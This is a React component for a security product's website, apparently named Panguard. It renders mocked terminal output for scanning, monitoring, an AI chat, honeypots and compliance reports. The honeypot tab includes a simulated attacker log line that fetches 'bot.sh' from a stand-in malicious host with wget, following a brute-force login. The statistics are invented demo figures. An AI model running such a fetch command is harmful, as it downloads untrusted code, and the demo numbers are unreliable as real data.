"use client";

import { useState } from "react";
import { motion, AnimatePresence } from "framer-motion";
import BrandLogo from "./BrandLogo";

/* ─── Tab definitions ─── */

const tabs = [
  { id: "scan", label: "Scan" },
  { id: "guard", label: "Guard" },
  { id: "chat", label: "Chat" },
  { id: "trap", label: "Trap" },
  { id: "report", label: "Report" },
] as const;

type TabId = (typeof tabs)[number]["id"];

/* ─── Line types for structured rendering ─── */

interface Line {
  text: string;
  color?: string;
}

const c = {
  cmd: "text-brand-sage",
  ok: "text-[#2ED573]",
  warn: "text-[#FBBF24]",
  err: "text-[#EF4444]",
  dim: "text-text-tertiary",
  muted: "text-text-muted",
  base: "text-text-secondary",
  bright: "text-text-primary",
  sage: "text-brand-sage",
};

/* ─── CLI content for each tab ─── */

const tabContent: Record<TabId, Line[]> = {
  scan: [
    { text: "$ panguard scan --deep", color: c.cmd },
    { text: "  Initializing core components...", color: c.base },
    { text: "  Scanning system for threats...", color: c.base },
    { text: "  \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 100%", color: c.ok },
    { text: "" },
    { text: "Scan Complete. 3 issues found.", color: c.bright },
    { text: "" },
    { text: "  SEVERITY   ISSUE                 STATUS", color: c.dim },
    { text: "  HIGH       Open SSH on 0.0.0.0   Auto-fixed \u2713", color: c.err },
    { text: "  MEDIUM     TLS 1.1 detected      Remediation ready", color: c.warn },
    { text: "  LOW        Kernel outdated        Noted", color: c.base },
    { text: "" },
    { text: "Score: 87/100 (B+)", color: c.sage },
    { text: "Report saved \u2192 ./panguard-report-2026-02-26.pdf", color: c.dim },
  ],
  guard: [
    { text: "$ panguard status", color: c.cmd },
    { text: "PANGUARD Guard v2.1.0 \u2014 Status Report", color: c.bright },
    { text: "" },
    { text: "  Threat Monitoring    ACTIVE \u25cf", color: c.ok },
    { text: "  Data Encryption      ENABLED (AES-256)", color: c.ok },
    { text: "  AI Engine            Layer 1: 847 rules | Layer 2: LLM ready", color: c.ok },
    { text: "  Uptime               14d 6h 32m", color: c.base },
    { text: "" },
    { text: "Events (last 24h):", color: c.bright },
    { text: "  \u2713 2,847 threats blocked", color: c.ok },
    { text: "  \u2713 12 brute-force attempts \u2192 auto-blocked", color: c.ok },
    { text: "  \u2713 1 suspicious process \u2192 quarantined", color: c.warn },
    { text: "  \u2713 0 critical incidents", color: c.ok },
    { text: "" },
    { text: "All systems normal. No action required.", color: c.sage },
  ],
  chat: [
    { text: "$ panguard chat", color: c.cmd },
    { text: "You: What happened last night?", color: c.bright },
    { text: "" },
    { text: "Panguard: Between 02:00-06:00, I handled 3 events:", color: c.sage },
    { text: "" },
    { text: "  1. SSH brute-force from 185.220.xx.xx (Russia)", color: c.base },
    { text: "     \u2192 47 attempts, all blocked. IP added to blocklist.", color: c.ok },
    { text: "" },
    { text: "  2. Port scan on 443, 8080, 3306", color: c.base },
    { text: "     \u2192 Automated scanner. No vulnerability found.", color: c.ok },
    { text: "" },
    { text: "  3. Kernel security patch available (5.15.0-91)", color: c.base },
    { text: "     \u2192 Scheduled for next maintenance window.", color: c.warn },
    { text: "" },
    { text: "Nothing requires your attention. Score: 94/100.", color: c.sage },
  ],
  trap: [
    { text: "$ panguard trap --status", color: c.cmd },
    { text: "Active Honeypots: 4/8", color: c.bright },
    { text: "" },
    { text: "  PORT   TYPE    INTERACTIONS   LAST ACTIVITY", color: c.dim },
    { text: "  2222   SSH     847            2 min ago", color: c.base },
    { text: "  8080   HTTP    234            15 min ago", color: c.base },
    { text: "  3306   MySQL   56             1h ago", color: c.base },
    { text: "  6379   Redis   12             3h ago", color: c.muted },
    { text: "" },
    { text: "Latest capture (SSH 2222):", color: c.bright },
    { text: "  03:12:41 Connection from 185.220.xx.xx", color: c.warn },
    { text: "  03:12:43 Brute-force: root/admin123 \u2717", color: c.err },
    { text: "  03:12:47 Login success (honeypot creds)", color: c.warn },
    { text: "  03:12:51 wget http://malicious.xx/bot.sh", color: c.err },
    { text: "  03:12:52 File captured \u2192 SHA256: 8a3f...", color: c.ok },
    { text: "  03:12:56 IOC submitted to threat cloud \u2713", color: c.sage },
  ],
  report: [
    { text: "$ panguard report generate --framework iso27001", color: c.cmd },
    { text: "Generating ISO 27001 Compliance Report...", color: c.base },
    { text: "" },
    { text: "  Analyzing 114 controls...", color: c.base },
    { text: "  \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 100%", color: c.ok },
    { text: "" },
    { text: "Coverage: 94% (107/114 controls met)", color: c.bright },
    { text: "" },
    { text: "  CATEGORY                  COVERAGE", color: c.dim },
    { text: "  Access Control            100% \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588", color: c.ok },
    { text: "  Cryptography               96% \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2591", color: c.ok },
    { text: "  Operations Security        92% \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2591\u2591", color: c.warn },
    { text: "  Incident Management       100% \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588", color: c.ok },
    { text: "" },
    { text: "Report saved \u2192 ./iso27001-report-2026-02-26.pdf", color: c.dim },
    { text: "Evidence package \u2192 ./iso27001-evidence.zip", color: c.dim },
  ],
};

/* ═══════════════════════  Component  ═══════════════════════ */

export default function CLIShowcase() {
  const [activeTab, setActiveTab] = useState<TabId>("scan");

  return (
    <div className="relative max-w-4xl mx-auto">
      {/* Terminal chrome */}
      <div className="bg-[#1C1814] rounded-t-xl border border-border border-b-0 px-4 py-3 flex items-center gap-3">
        <div className="flex gap-1.5">
          <div className="w-2.5 h-2.5 rounded-full bg-[#EF4444]" />
          <div className="w-2.5 h-2.5 rounded-full bg-[#FBBF24]" />
          <div className="w-2.5 h-2.5 rounded-full bg-[#2ED573]" />
        </div>
        <div className="flex items-center gap-2 ml-3">
          <BrandLogo size={14} className="text-brand-sage" />
          <span className="text-xs font-mono text-text-secondary">
            PANGUARD [-] AI CLI v2.1.0
          </span>
        </div>
        <span className="ml-auto text-[10px] font-mono text-text-muted hidden sm:block">
          SYSTEM: ONLINE | CPU: 12% | MEM: 4GB | LATENCY: 2ms
        </span>
      </div>

      {/* Tab bar */}
      <div className="bg-[#1A1614] border-x border-border flex gap-0 overflow-x-auto scrollbar-hide">
        {tabs.map((tab) => {
          const isActive = activeTab === tab.id;
          return (
            <button
              key={tab.id}
              onClick={() => setActiveTab(tab.id)}
              className={`relative px-5 py-2.5 text-xs font-mono font-medium transition-colors shrink-0 ${
                isActive
                  ? "text-brand-sage bg-brand-sage/10"
                  : "text-text-muted hover:text-text-secondary"
              }`}
            >
              {tab.label}
              {isActive && (
                <motion.div
                  layoutId="cli-tab-indicator"
                  className="absolute bottom-0 left-0 right-0 h-[2px] bg-brand-sage"
                  transition={{ type: "spring", stiffness: 400, damping: 30 }}
                />
              )}
            </button>
          );
        })}
      </div>

      {/* Terminal body */}
      <div className="bg-[#1A1614] rounded-b-xl border border-border border-t-0 p-5 sm:p-6 font-mono text-[12px] sm:text-[13px] leading-[1.7] min-h-[380px] overflow-x-auto">
        <AnimatePresence mode="wait">
          <motion.div
            key={activeTab}
            initial={{ opacity: 0, y: 6 }}
            animate={{ opacity: 1, y: 0 }}
            exit={{ opacity: 0, y: -6 }}
            transition={{ duration: 0.15 }}
          >
            {tabContent[activeTab].map((line, i) => {
              if (!line.text) return <div key={i} className="h-3" />;
              return (
                <div key={i} className={`${line.color || c.base} whitespace-pre`}>
                  {line.text}
                </div>
              );
            })}
          </motion.div>
        </AnimatePresence>
      </div>

      {/* Ambient glow */}
      <div className="absolute -inset-8 bg-brand-sage/3 rounded-3xl blur-[60px] -z-10" />
    </div>
  );
}
